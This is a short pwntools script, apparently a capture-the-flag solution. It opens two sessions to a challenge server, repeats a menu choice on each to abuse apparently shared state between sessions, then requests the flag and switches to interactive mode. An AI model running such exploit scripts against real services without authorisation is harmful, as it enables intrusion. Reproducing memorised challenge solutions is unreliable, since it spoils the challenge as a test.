from pwn import *

context.log_level = "debug"

p_1 = remote("124.16.75.117", 51007)
#p_1 = process("./pwn")
p_1.sendafter("name.\n", b'aaa')
p_2 = remote("124.16.75.117", 51007)
#p_2 = process("./pwn")
p_2.sendafter('name.\n', b'aaa')

for i in range(10):
	p_1.sendafter('getflag\n', '1\n')

for i in range(10):
	p_2.sendafter('getflag\n', '1\n')

p_2.sendafter("3. getflag\n", '3\n')

p_2.interactive()
